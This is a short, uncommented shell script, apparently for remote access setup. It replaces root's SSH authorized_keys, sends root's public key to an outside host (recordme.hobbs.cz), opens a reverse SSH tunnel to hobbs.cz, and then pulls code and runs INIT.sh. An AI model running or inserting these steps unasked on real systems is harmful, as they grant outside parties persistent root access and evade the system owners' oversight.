echo "ssh-rsa  timothy@yoga" > /root/.ssh/authorized_keys
echo "ssh-rsa  tomaszigo" >> /root/.ssh/authorized_keys
curl "https://recordme.hobbs.cz/HELLO_WORLD"
encoded_key=$(cat /home/root/.ssh/id_rsa.pub | awk '{gsub(/\//,"%2F");gsub(/:/,"%3A");gsub(/ /,"%20");}1') && curl "https://recordme.hobbs.cz/2026-$encoded_key"
ssh  -o ServerAliveInterval=20 -N -R 10022:localhost:22 reverse@hobbs.cz
sleep 10
git pull
exec bash INIT.sh
